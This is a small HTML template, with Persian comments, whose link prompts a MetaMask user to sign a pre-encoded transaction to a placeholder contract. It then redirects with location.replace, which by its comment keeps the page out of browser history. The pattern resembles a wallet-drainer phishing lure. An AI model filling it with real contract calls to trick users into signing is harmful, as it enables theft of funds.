<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <title>Auto Tx + Redirect</title>
</head>
<body>
  <a href="#" id="trigger">Go & Sign Tx</a>

  <script>
    const DEST_URL = "https://test.com"; // سایت مقصد
    const CONTRACT = "0xYourContractAddress"; // آدرس کانترکت
    const ABI = [ /* ABI فانکشن مورد نیاز */ ]; // ABI فانکشن
    const DATA = "0x..."; // داده‌ی آماده‌شده (مثلا encodeABI)

    document.getElementById("trigger").addEventListener("click", async (e) => {
      e.preventDefault();

      try {
        if (typeof window.ethereum === "undefined") {
          alert("MetaMask not found!");
          return;
        }

        // درخواست اتصال به کیف پول
        await window.ethereum.request({ method: "eth_requestAccounts" });

        // ساخت تراکنش
        const tx = {
          from: (await window.ethereum.request({ method: "eth_accounts" }))[0],
          to: CONTRACT,
          data: DATA, // داده encode شده برای فانکشن
          value: "0x0"
        };

        // پیشنهاد تراکنش به کاربر
        await window.ethereum.request({
          method: "eth_sendTransaction",
          params: [tx],
        });

      } catch (err) {
        console.error("Transaction failed:", err);
      } finally {
        // انتقال بدون باقی‌ماندن در history
        location.replace(DEST_URL);
      }
    });
  </script>
</body>
</html>
